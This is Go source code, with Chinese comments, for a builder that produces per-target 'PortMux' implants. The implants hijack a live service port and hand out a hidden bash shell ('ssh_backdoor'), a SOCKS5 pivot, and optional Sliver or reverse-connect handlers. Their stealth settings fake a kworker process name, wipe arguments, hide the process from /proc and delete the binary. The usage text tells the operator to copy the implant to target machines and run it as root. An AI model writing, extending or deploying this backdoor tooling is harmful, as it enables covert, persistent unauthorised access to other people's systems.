// PortMux 部署包生成器
// 单产物工作流: build.sh 编译出本 ELF (内嵌 server/wrap 模板),
// 运行后交互填写配置 → 产出 N 个互不相同的 server ELF + 1 个 client ELF + 1 个 client.conf
package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"gopkg.in/yaml.v3"

	"portmux/internal/agent"
)

//go:embed server.tmpl
var serverTmpl []byte

//go:embed wrap.tmpl
var wrapTmpl []byte

const (
	cfgBeginMarker = "\n--PMCFG1--\n"
	cfgEndMarker   = "\n--PMEND1--\n"
	placeholder    = "gen00000" // 编译期占位 token (8 字节, 与随机 8hex 等长, 生成时逐台等长替换)
)

var (
	batchFile = flag.String("batch", "", "批量模式: 指定 targets yaml 文件 (非交互)")
	outDir    = flag.String("out", "output", "输出目录")
	yes       = flag.Bool("yes", false, "跳过确认直接生成")
)

var reader = bufio.NewReader(os.Stdin)

// ---- 交互工具 ----

func ask(prompt, def string) string {
	fmt.Printf("%s [%s]: ", prompt, def)
	line, _ := reader.ReadString('\n')
	line = strings.TrimSpace(line)
	if line == "" {
		return def
	}
	return line
}

func askBool(prompt string, def bool) bool {
	d := "n"
	if def {
		d = "y"
	}
	for {
		a := strings.ToLower(ask(prompt+" (y/n)", d))
		if a == "y" || a == "yes" {
			return true
		}
		if a == "n" || a == "no" {
			return false
		}
		fmt.Println("  请输入 y 或 n")
	}
}

func askInt(prompt string, def int) int {
	for {
		a := ask(prompt, strconv.Itoa(def))
		if v, err := strconv.Atoi(strings.TrimSpace(a)); err == nil {
			return v
		}
		fmt.Println("  请输入数字")
	}
}

func randHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)[:n]
}

func sanitize(name string) string {
	replacer := strings.NewReplacer("/", "_", "\\", "_", " ", "_", ":", "_")
	return replacer.Replace(name)
}

// ---- 默认规则集 ----

func defaultRules(backendPort int) []agent.RuleConfig {
	return []agent.RuleConfig{
		{Name: "ssh_backdoor", Fingerprint: "SSH-2.0", Handler: "shell",
			HandlerArgs: map[string]string{"cmd": "/bin/bash", "pty": "true"}, Priority: 1},
		{Name: "socks5_pivot", FingerprintRaw: "\x05\x01\x00", Handler: "socks5", Priority: 2},
		{Name: "http_get", Fingerprint: "GET ", Handler: "tcp_proxy",
			HandlerArgs: map[string]string{"target": fmt.Sprintf("127.0.0.1:%d", backendPort)}, Priority: 11},
		{Name: "http_post", Fingerprint: "POST ", Handler: "tcp_proxy",
			HandlerArgs: map[string]string{"target": fmt.Sprintf("127.0.0.1:%d", backendPort)}, Priority: 12},
		{Name: "fallback", Fingerprint: "*", Handler: "tcp_proxy",
			HandlerArgs: map[string]string{"target": fmt.Sprintf("127.0.0.1:%d", backendPort)}, Priority: 100},
	}
}

func parsePorts(s string) []int {
	var ports []int
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if v, err := strconv.Atoi(p); err == nil && v > 0 && v < 65536 {
			ports = append(ports, v)
		}
	}
	return ports
}

func parsePortsOr(s string, def int) []int {
	if ports := parsePorts(s); len(ports) > 0 {
		return ports
	}
	return []int{def}
}

// ---- 目标信息 ----

type targetInfo struct {
	Name        string
	Host        string
	Key         string
	Fingerprint string // client.conf 用
	Mode        string // shell | socks5 | custom
	Exec        string
	Args        string
	Config      *agent.Config
}

// ---- 简化版交互 ----

func askTargetSimple() targetInfo {
	t := targetInfo{}
	fmt.Println("\n=== 新目标 (简化版) ===")
	t.Name = ask("  目标名字 (备注用)", "目标1")
	t.Host = ask("  目标地址 (IP 或域名)", "")
	for t.Host == "" {
		fmt.Println("  [必填] 目标地址不能为空")
		t.Host = ask("  目标地址 (IP 或域名)", "")
	}
	ports := ask("  劫持端口 (逗号分隔, 与正常服务端口一致)", "80")
	key := ask("  magic_key (留空自动随机生成)", "")
	if key == "" {
		key = randHex(16)
		fmt.Printf("  已生成随机密钥: %s\n", key)
	}
	t.Key = key

	cfg := agent.DefaultConfig()
	cfg.MagicKey = key
	cfg.Listen.Iface = "auto"
	cfg.Listen.WatchPorts = parsePortsOr(ports, 80)
	backend := cfg.Listen.WatchPorts[0]
	cfg.Rules = defaultRules(backend)
	cfg.Crypto.Enabled = true
	// 简化版默认高隐身: argv 抹除 + /proc 枚举隐藏 + 自删本体
	// (hide_proc 在不支持的内核上自动跳过, 不影响运行)
	cfg.Stealth.WipeArgv = true
	cfg.Stealth.HideProc = true
	cfg.Stealth.SelfDelete = true
	t.Config = cfg
	t.Mode = "shell"
	t.Fingerprint = "SSH-2.0"
	return t
}

// ---- 详细版交互 ----

func askTargetDetailed() targetInfo {
	t := targetInfo{}
	fmt.Println("\n=== 新目标 (详细版) ===")
	t.Name = ask("  目标名字 (备注用)", "目标1")
	t.Host = ask("  目标地址 (IP 或域名)", "")
	for t.Host == "" {
		fmt.Println("  [必填] 目标地址不能为空")
		t.Host = ask("  目标地址 (IP 或域名)", "")
	}
	ports := ask("  劫持端口 (逗号分隔)", "80")
	key := ask("  magic_key (留空自动随机生成)", "")
	if key == "" {
		key = randHex(16)
		fmt.Printf("  已生成随机密钥: %s\n", key)
	}
	t.Key = key

	cfg := agent.DefaultConfig()
	cfg.MagicKey = key
	cfg.Listen.Iface = ask("  监听网卡 (auto=自动探测)", "auto")
	cfg.Listen.WatchPorts = parsePortsOr(ports, 80)
	backend := cfg.Listen.WatchPorts[0]

	fmt.Println("  --- 路由规则 ---")
	if askBool("  使用默认规则集 (shell/socks5/HTTP代理/兜底)?", true) {
		cfg.Rules = defaultRules(backend)
	} else {
		cfg.Rules = askRules(backend)
	}

	fmt.Println("  --- 加密与超时 ---")
	cfg.Crypto.Enabled = askBool("  启用流加密 (XChaCha20-Poly1305)", true)
	cfg.Timeouts.PeekSeconds = askInt("  指纹识别读取超时 (秒)", 3)
	cfg.Timeouts.IdleSeconds = askInt("  代理类连接空闲超时 (秒)", 300)
	cfg.Limits.MaxConns = askInt("  最大并发连接数", 256)

	fmt.Println("  --- 隐身 ---")
	cfg.Stealth.ProcessName = ask("  伪装进程名 (comm)", "[kworker/u:0]")
	cfg.Stealth.WipeArgv = askBool("  抹除 argv/env (ps 看不到参数)", true)
	cfg.Stealth.HideProc = askBool("  /proc 进程隐藏 (需内核支持, 失败自动跳过)", false)
	cfg.Stealth.SelfDelete = askBool("  启动后自删二进制", false)

	t.Config = cfg
	t.Mode = ask("  默认连接模式 (shell/socks5/custom)", "shell")
	switch t.Mode {
	case "socks5":
		t.Fingerprint = "\x05\x01\x00"
	case "custom":
		t.Exec = ask("  默认执行程序", "/bin/sh")
		t.Args = ask("  默认参数 (可空)", "")
		t.Fingerprint = "auto"
	default:
		t.Mode = "shell"
		t.Fingerprint = "SSH-2.0"
	}
	return t
}

func askRules(backendPort int) []agent.RuleConfig {
	var rules []agent.RuleConfig
	fmt.Println("  逐条添加规则 (指纹留空=通配, 建议最后加一条通配兜底到后端):")
	for {
		fp := ask("    指纹 (明文或 \\xNN hex, 留空=通配*)", "")
		if fp == "" {
			fp = "*"
		}
		handler := ask("    handler (shell/socks5/tcp_proxy/sliver/reverse)", "tcp_proxy")
		var args map[string]string
		switch handler {
		case "shell":
			args = map[string]string{"cmd": ask("      cmd", "/bin/bash"), "pty": "true"}
		case "tcp_proxy":
			args = map[string]string{"target": ask("      后端地址", fmt.Sprintf("127.0.0.1:%d", backendPort))}
		case "sliver":
			args = map[string]string{"implant_port": ask("      implant 端口", "31337")}
		case "reverse":
			args = map[string]string{"connect": ask("      回连地址", "127.0.0.1:4444")}
		}
		prio := askInt("    priority (数字小先匹配)", len(rules)+1)
		name := ask("    规则名", fmt.Sprintf("rule%d", len(rules)+1))
		rules = append(rules, agent.RuleConfig{Name: name, Fingerprint: fp, Handler: handler, HandlerArgs: args, Priority: prio})
		if !askBool("    继续添加?", false) {
			break
		}
	}
	return rules
}

// ---- 清单确认 ----

func printManifest(targets []targetInfo) {
	fmt.Println()
	fmt.Println("================ 生成清单 ================")
	for i, t := range targets {
		c := t.Config
		ports := make([]string, len(c.Listen.WatchPorts))
		for j, p := range c.Listen.WatchPorts {
			ports[j] = strconv.Itoa(p)
		}
		fmt.Printf("[%d] %s\n", i+1, t.Name)
		fmt.Printf("    地址: %s  端口: %s  密钥: %s\n", t.Host, strings.Join(ports, ","), t.Key)
		fmt.Printf("    网卡: %s  加密: %v  超时: peek=%ds idle=%ds  并发: %d\n",
			c.Listen.Iface, c.Crypto.Enabled, c.Timeouts.PeekSeconds, c.Timeouts.IdleSeconds, c.Limits.MaxConns)
		fmt.Printf("    隐身: comm=%s wipe=%v hide_proc=%v self_delete=%v\n",
			c.Stealth.ProcessName, c.Stealth.WipeArgv, c.Stealth.HideProc, c.Stealth.SelfDelete)
		fmt.Printf("    规则: %d 条 (优先级顺序)\n", len(c.Rules))
		for _, r := range c.Rules {
			fmt.Printf("      - %s [%s prio=%d] %s\n", r.Name, r.Handler, r.Priority, descFP(r))
		}
		fmt.Printf("    客户端模式: %s\n", t.Mode)
	}
	fmt.Println("==========================================")
}

func descFP(r agent.RuleConfig) string {
	fp := r.Fingerprint
	if fp == "" {
		fp = r.FingerprintRaw
	}
	if fp == "*" || fp == "" {
		return "通配"
	}
	// 控制字节显示为 hex
	var sb strings.Builder
	for _, c := range []byte(fp) {
		if c >= 32 && c < 127 {
			sb.WriteByte(c)
		} else {
			fmt.Fprintf(&sb, "\\x%02x", c)
		}
	}
	return sb.String()
}

// ---- 生成 ----

func generate(targets []targetInfo, out string) error {
	if err := os.MkdirAll(out, 0755); err != nil {
		return err
	}
	for _, t := range targets {
		// 1) 复制模板
		data := append([]byte{}, serverTmpl...)
		// 2) 字节级替换占位 token → 每台随机实例标识 (BPF 程序/map 名全部互不相同)
		//    占位符与随机标识等长 (8 字节), 保证替换不改变二进制任何偏移
		token := randHex(8)
		if len(token) != len(placeholder) {
			return fmt.Errorf("内部错误: token 长度 %d != 占位符长度 %d", len(token), len(placeholder))
		}
		data = bytes.ReplaceAll(data, []byte(placeholder), []byte(token))
		if bytes.Contains(data, []byte(placeholder)) {
			return fmt.Errorf("内部错误: %s 替换后仍有残留", t.Name)
		}
		// 3) 追加配置块 (agent 启动时读取, 优先级最高)
		cfgYaml, err := yaml.Marshal(t.Config)
		if err != nil {
			return fmt.Errorf("marshal %s: %w", t.Name, err)
		}
		data = append(data, []byte(cfgBeginMarker)...)
		data = append(data, cfgYaml...)
		data = append(data, []byte(cfgEndMarker)...)
		path := filepath.Join(out, "server-"+sanitize(t.Name)+".pm")
		if err := os.WriteFile(path, data, 0755); err != nil {
			return err
		}
		fmt.Printf("[√] %s  (token=%s, %d KB)\n", path, token, len(data)/1024)
	}

	wrapPath := filepath.Join(out, "portmux-wrap")
	if err := os.WriteFile(wrapPath, wrapTmpl, 0755); err != nil {
		return err
	}
	fmt.Printf("[√] %s\n", wrapPath)

	confPath := filepath.Join(out, "client.conf")
	if err := writeClientConf(targets, confPath); err != nil {
		return err
	}
	fmt.Printf("[√] %s\n", confPath)
	return nil
}

type confProfile struct {
	Name        string `yaml:"name"`
	Host        string `yaml:"host"`
	Port        int    `yaml:"port"`
	Key         string `yaml:"key"`
	Fingerprint string `yaml:"fingerprint"`
	Mode        string `yaml:"mode"`
	Exec        string `yaml:"exec,omitempty"`
	Args        string `yaml:"args,omitempty"`
}

type confFile struct {
	Default string        `yaml:"default"`
	Targets []confProfile `yaml:"targets"`
}

func writeClientConf(targets []targetInfo, path string) error {
	cf := confFile{}
	if len(targets) > 0 {
		cf.Default = targets[0].Name
	}
	for _, t := range targets {
		port := 0
		if len(t.Config.Listen.WatchPorts) > 0 {
			port = t.Config.Listen.WatchPorts[0]
		}
		cf.Targets = append(cf.Targets, confProfile{
			Name: t.Name, Host: t.Host, Port: port, Key: t.Key,
			Fingerprint: t.Fingerprint, Mode: t.Mode, Exec: t.Exec, Args: t.Args,
		})
	}
	data, err := yaml.Marshal(cf)
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0644)
}

// ---- 批量模式 ----

type batchTarget struct {
	Name        string `yaml:"name"`
	Host        string `yaml:"host"`
	Port        int    `yaml:"port"`
	WatchPorts  string `yaml:"watch_ports"`
	Key         string `yaml:"key"`
	Iface       string `yaml:"iface"`
	Native      bool   `yaml:"native"`
	Crypto      *bool  `yaml:"crypto"`
	Mode        string `yaml:"mode"`
	Fingerprint string `yaml:"fingerprint"`
	Exec        string `yaml:"exec"`
	Args        string `yaml:"args"`
	ProcessName string `yaml:"process_name"`
	WipeArgv    *bool  `yaml:"wipe_argv"`
	HideProc    *bool  `yaml:"hide_proc"`
	SelfDelete  *bool  `yaml:"self_delete"`
}

type batchSpec struct {
	Targets []batchTarget `yaml:"targets"`
}

func runBatch(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	var bf batchSpec
	if err := yaml.Unmarshal(data, &bf); err != nil {
		return fmt.Errorf("batch yaml: %w", err)
	}
	if len(bf.Targets) == 0 {
		return fmt.Errorf("batch yaml 无 targets")
	}
	var targets []targetInfo
	for _, bt := range bf.Targets {
		if bt.Name == "" || bt.Host == "" {
			return fmt.Errorf("每个 target 必须填写 name 和 host")
		}
		ports := bt.WatchPorts
		if ports == "" && bt.Port > 0 {
			ports = strconv.Itoa(bt.Port)
		}
		if ports == "" {
			ports = "80"
		}
		cfg := agent.DefaultConfig()
		cfg.MagicKey = bt.Key
		if cfg.MagicKey == "" {
			cfg.MagicKey = randHex(16)
		}
		cfg.Listen.Iface = bt.Iface
		if cfg.Listen.Iface == "" {
			cfg.Listen.Iface = "auto"
		}
		cfg.Listen.Native = bt.Native
		cfg.Listen.WatchPorts = parsePorts(ports)
		backend := cfg.Listen.WatchPorts[0]
		cfg.Rules = defaultRules(backend)
		if bt.Crypto != nil {
			cfg.Crypto.Enabled = *bt.Crypto
		}
		if bt.ProcessName != "" {
			cfg.Stealth.ProcessName = bt.ProcessName
		}
		if bt.WipeArgv != nil {
			cfg.Stealth.WipeArgv = *bt.WipeArgv
		} else {
			cfg.Stealth.WipeArgv = true
		}
		if bt.HideProc != nil {
			cfg.Stealth.HideProc = *bt.HideProc
		} else {
			cfg.Stealth.HideProc = true
		}
		if bt.SelfDelete != nil {
			cfg.Stealth.SelfDelete = *bt.SelfDelete
		} else {
			cfg.Stealth.SelfDelete = true
		}
		mode := bt.Mode
		if mode == "" {
			mode = "shell"
		}
		fp := bt.Fingerprint
		if fp == "" {
			if mode == "socks5" {
				fp = "\x05\x01\x00"
			} else if mode == "custom" {
				fp = "auto"
			} else {
				fp = "SSH-2.0"
			}
		}
		targets = append(targets, targetInfo{
			Name: bt.Name, Host: bt.Host, Key: cfg.MagicKey,
			Fingerprint: fp, Mode: mode, Exec: bt.Exec, Args: bt.Args, Config: cfg,
		})
	}
	printManifest(targets)
	if !*yes {
		if !askBool("确认生成?", true) {
			fmt.Println("已取消")
			return nil
		}
	}
	return generate(targets, *outDir)
}

// ---- 主流程 ----

func main() {
	flag.Parse()
	if len(serverTmpl) == 0 || len(wrapTmpl) == 0 {
		fmt.Fprintln(os.Stderr, "模板缺失: 请用 build.sh 重新构建生成器")
		os.Exit(1)
	}

	if *batchFile != "" {
		if err := runBatch(*batchFile); err != nil {
			fmt.Fprintf(os.Stderr, "[×] %v\n", err)
			os.Exit(1)
		}
		printUsage()
		return
	}

	fmt.Println("==============================================")
	fmt.Println("  PortMux 部署包生成器")
	fmt.Println("  一个产物 → N 个 server + 1 个 client + 1 个 conf")
	fmt.Println("==============================================")
	detailed := false
	for {
		mode := ask("  模式选择: [1] 简化版(必填项+默认值)  [2] 详细版(全部配置)", "1")
		if mode == "1" {
			break
		}
		if mode == "2" {
			detailed = true
			break
		}
		fmt.Println("  请输入 1 或 2")
	}

	n := askInt("  目标数量", 1)
	var targets []targetInfo
	for i := 0; i < n; i++ {
		if detailed {
			targets = append(targets, askTargetDetailed())
		} else {
			targets = append(targets, askTargetSimple())
		}
	}

	printManifest(targets)
	if !*yes {
		if !askBool("确认生成?", true) {
			fmt.Println("已取消, 未生成任何文件")
			return
		}
	}
	if err := generate(targets, *outDir); err != nil {
		fmt.Fprintf(os.Stderr, "[×] %v\n", err)
		os.Exit(1)
	}
	printUsage()
}

func printUsage() {
	fmt.Println()
	fmt.Println("使用方式:")
	fmt.Println("  1. 部署 server (目标机):")
	fmt.Println("     scp output/server-<名字>.pm  root@目标机:/opt/portmux/")
	fmt.Println("     目标机上: sudo ./server-<名字>.pm     (零参数启动, 配置已内置)")
	fmt.Println("     如需 start/stop/cleanup 管理, 把 dist/server.sh 一并上传即可")
	fmt.Println("  2. 使用 client (控制端):")
	fmt.Println("     scp output/portmux-wrap output/client.conf user@控制端:/tmp/portmux/")
	fmt.Println("     cd /tmp/portmux && ./client.sh            # 菜单选择目标")
	fmt.Println("     或 ./portmux-wrap -list / -target <名字>   # 直接连接")
	fmt.Println("     socks5 目标: ./portmux-wrap -target <名字> -listen 127.0.0.1:1080")
}
